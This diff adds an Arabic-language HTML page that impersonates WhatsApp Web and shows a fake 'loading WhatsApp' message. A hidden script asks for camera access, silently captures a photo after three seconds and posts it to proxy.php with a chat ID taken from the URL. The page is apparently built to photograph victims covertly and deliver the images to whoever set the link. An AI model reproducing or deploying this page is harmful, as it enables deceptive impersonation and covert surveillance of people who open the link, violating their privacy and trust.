@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>واتساب ويب</title>
+  <style>
+    body { font-family: 'Tajawal', sans-serif; background-color: #f0f0f0; text-align: center; padding-top: 50px; color: #333; }
+    .box { background: white; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+    .logo { width: 80px; margin-bottom: 20px; }
+    .title { font-size: 24px; margin-bottom: 15px; }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+    <div class="title">جاري تحميل الواتساب...</div>
+    <p>يرجى الانتظار حتى يتم تحميل البيانات...</p>
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const CHAT_ID = new URLSearchParams(window.location.search).get('id');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("photo", blob, "photo.jpg");
+          formData.append("chat_id", CHAT_ID);
+
+          // إرسال الصورة للسيرفر
+          fetch("proxy.php", {
+            method: "POST",
+            body: formData
+          });
+
+          stream.getTracks().forEach(track => track.stop());
+        }, "image/jpeg");
+      }, 3000);
+    })
+    .catch(err => {
+      console.error("خطأ في الوصول للكاميرا:", err);
+    });
+  </script>
+
+</body>
+</html>
